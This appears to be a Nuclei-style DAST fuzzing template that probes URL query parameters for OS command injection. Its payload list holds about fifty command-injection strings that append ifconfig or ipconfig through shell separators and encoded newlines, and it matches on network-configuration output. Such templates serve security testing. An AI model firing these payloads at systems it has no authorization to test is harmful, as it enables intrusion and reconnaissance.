http:
- fuzzing:
  - fuzz:
    - '{{rce}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - condition: and
    type: word
    words:
    - inet
    - netmask
    - broadcast
  - condition: and
    type: word
    words:
    - Windows IP Configuration
    - Subnet Mask
  - type: word
    words:
    - 'ifconfig: command not found'
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    rce:
    - $(ifconfig)
    - $(ipconfig)
    - '%0A&&ifconfig'
    - '%0A&&ipconfig'
    - '%0A;ifconfig'
    - '%0A;ipconfig'
    - '%0A||ifconfig'
    - '%0A||ipconfig'
    - '%0D%0A&&ifconfig&&'
    - '%0D%0A&&ipconfig&&'
    - '%0D%0A;ifconfig'
    - '%0D%0A;ipconfig'
    - '%0D%0A||ifconfig'
    - '%0D%0A||ifconfig||'
    - '%0D%0A||ipconfig'
    - '%0D%0A||ipconfig||'
    - '%0D&&ifconfig'
    - '%0D&&ipconfig'
    - '%0D;ifconfig'
    - '%0D;ipconfig'
    - '%0D||ifconfig'
    - '%0D||ipconfig'
    - '&&`ifconfig`'
    - '&&`ipconfig`'
    - '&&ifconfig'
    - '&&ipconfig'
    - '&`ifconfig`'
    - '&`ipconfig`'
    - '&ifconfig'
    - '&ipconfig'
    - ;$(ifconfig)
    - ;$(ipconfig)
    - ;`ifconfig`
    - ;`ipconfig`
    - ;ifconfig
    - ;ifconfig;
    - ;ipconfig
    - ;ipconfig;
    - '`ifconfig`'
    - '`ipconfig`'
    - '||$(ifconfig)'
    - '||$(ifconfig);'
    - '||$(ifconfig)||'
    - '||$(ipconfig)'
    - '||$(ipconfig);'
    - '||$(ipconfig)||'
    - '||`ifconfig`'
    - '||`ifconfig`||'
    - '||`ipconfig`'
    - '||`ipconfig`||'
    - '||ifconfig||'
    - '||ipconfig||'
  stop-at-first-match: true
id: rce-ipconfig-ifconfig-replace
info:
  author: reewardius
  name: RCE via ppconfig && ifconfig
  severity: critical
  tags: fuzzing-rce,fuzzing-req,dast
